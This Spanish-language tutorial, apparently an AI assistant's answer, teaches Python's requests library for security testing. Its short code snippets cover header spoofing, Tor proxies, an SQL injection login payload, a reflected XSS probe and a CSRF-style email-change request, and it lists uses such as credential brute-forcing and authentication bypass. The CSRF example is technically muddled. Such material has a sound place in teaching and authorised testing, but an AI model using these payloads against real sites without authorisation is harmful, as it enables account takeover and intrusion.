La biblioteca `requests` de Python es una herramienta fundamental para interactuar con servicios web mediante HTTP. En ciberseguridad, su uso es esencial para realizar pruebas de penetración, scraping, manipulación de encabezados, explotación de vulnerabilidades y automatización de interacciones con APIs.

---

## 📌 **Conceptos Claves de Requests en Ciberseguridad**
1. **Realizar peticiones GET y POST** → Obtener información de sitios web o enviar datos.
2. **Manipulación de Headers** → Modificar `User-Agent`, `Referer`, `Cookies`, etc.
3. **Gestión de Sesiones** → Mantener la autenticación en múltiples peticiones.
4. **Proxies y Tor** → Enviar tráfico a través de proxys para anonimato.
5. **Explotación de vulnerabilidades** → SQL Injection, XSS, CSRF.
6. **Extracción de información** → Web Scraping sin Selenium.

---

## 🔹 **1. Peticiones GET y POST Básicas**
### 🔹 GET: Extraer información de una página
```python
import requests

url = "https://example.com"
response = requests.get(url)

print(f"Status Code: {response.status_code}")
print(f"Contenido: {response.text[:500]}")  # Muestra solo los primeros 500 caracteres
```
🔹 **Usos en ciberseguridad**:
- Obtener información sobre servidores (`Server`, `X-Powered-By`, etc.).
- Extraer contenido de una página web para analizar vulnerabilidades.

---

### 🔹 POST: Enviar datos a un servidor
```python
url = "https://example.com/login"
data = {
    "username": "admin",
    "password": "password123"
}
response = requests.post(url, data=data)

print(f"Status Code: {response.status_code}")
print(f"Respuesta: {response.text[:500]}")
```
🔹 **Usos en ciberseguridad**:
- Realizar **fuerza bruta** de credenciales.
- Enviar formularios automáticamente.
- Explorar posibles **SQL Injection**.

---

## 🔹 **2. Manipulación de Headers**
Modificar los encabezados HTTP es esencial para pruebas de seguridad.
```python
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Referer": "https://example.com",
    "Cookie": "sessionid=1234567890",
    "X-Forwarded-For": "192.168.1.100"  # Para suplantar IP
}

url = "https://example.com/profile"
response = requests.get(url, headers=headers)

print(response.text)
```
🔹 **Usos en ciberseguridad**:
- Evadir protecciones por `User-Agent` (parecer un navegador real).
- Simular tráfico de otro origen (`Referer` falso).
- Pruebas de **IP Spoofing** con `X-Forwarded-For`.

---

## 🔹 **3. Autenticación y Mantenimiento de Sesión**
Cuando una web requiere autenticación, podemos usar `requests.Session()`.

```python
session = requests.Session()

login_url = "https://example.com/login"
data = {"username": "admin", "password": "password123"}

# Autenticarse
session.post(login_url, data=data)

# Acceder a una página protegida
protected_url = "https://example.com/dashboard"
response = session.get(protected_url)

print(response.text)
```
🔹 **Usos en ciberseguridad**:
- **Bypass de autenticaciones** automatizando sesiones.
- **Scraping de contenido protegido** sin tener que iniciar sesión manualmente.

---

## 🔹 **4. Uso de Proxies y Tor**
Para mejorar el anonimato, podemos usar proxys o Tor.

### 🔹 **Usar un Proxy HTTP**
```python
proxies = {
    "http": "http://127.0.0.1:8080",  # Proxy BurpSuite
    "https": "http://127.0.0.1:8080"
}

url = "https://example.com"
response = requests.get(url, proxies=proxies)

print(response.text)
```
🔹 **Usos en ciberseguridad**:
- Redirigir tráfico a **BurpSuite** para análisis.
- Evitar **detección de IPs** al cambiar proxys.

---

### 🔹 **Usar Tor para anonimato**
Requiere tener Tor en ejecución (puerto 9050).

```python
proxies = {
    "http": "socks5h://127.0.0.1:9050",
    "https": "socks5h://127.0.0.1:9050"
}

url = "http://check.torproject.org"  # Página que verifica si usamos Tor
response = requests.get(url, proxies=proxies)

print(response.text)
```
🔹 **Usos en ciberseguridad**:
- **Anonimato** en pruebas de pentesting.
- Acceder a sitios bloqueados por IP.

---

## 🔹 **5. Explotación de Vulnerabilidades**
### 🔹 **SQL Injection Automático**
```python
vulnerable_url = "https://example.com/login"
payload = {"username": "admin' OR '1'='1", "password": "password"}

response = requests.post(vulnerable_url, data=payload)

if "Welcome" in response.text:
    print("¡Posible SQL Injection detectado!")
else:
    print("No parece vulnerable.")
```
🔹 **Usos en ciberseguridad**:
- Detectar **inyecciones SQL** en formularios.
- Automatizar ataques SQL Injection.

---

### 🔹 **XSS Injection (Cross-Site Scripting)**
```python
xss_url = "https://example.com/search"
payload = {"q": "<script>alert('XSS')</script>"}

response = requests.get(xss_url, params=payload)

if "<script>alert('XSS')</script>" in response.text:
    print("¡Posible XSS detectado!")
```
🔹 **Usos en ciberseguridad**:
- Identificar páginas vulnerables a **XSS reflejado**.

---

### 🔹 **CSRF Attack (Cross-Site Request Forgery)**
Si un sitio no implementa protección CSRF, podemos automatizar una petición fraudulenta.

```python
csrf_url = "https://example.com/change-email"
data = {"email": "attacker@example.com"}

response = requests.post(csrf_url, data=data)

print(response.text)
```
🔹 **Usos en ciberseguridad**:
- Simular ataques de **CSRF** si no hay validación de tokens.

---

## 📌 **Resumen**
| Técnica | Uso en Ciberseguridad |
|---------|-----------------------|
| **GET / POST** | Extraer datos y enviar formularios automáticamente. |
| **Headers Modificados** | Evadir detecciones, manipular tráfico. |
| **Sesiones** | Mantener autenticaciones. |
| **Proxys y Tor** | Anonimato y pruebas en diferentes ubicaciones. |
| **SQL Injection** | Detectar vulnerabilidades en bases de datos. |
| **XSS** | Identificar vulnerabilidades de ejecución de scripts. |
| **CSRF** | Simular ataques de falsificación de solicitudes. |

---

¿Quieres que te ayude a crear un script más completo para automatizar alguna de estas pruebas? 🚀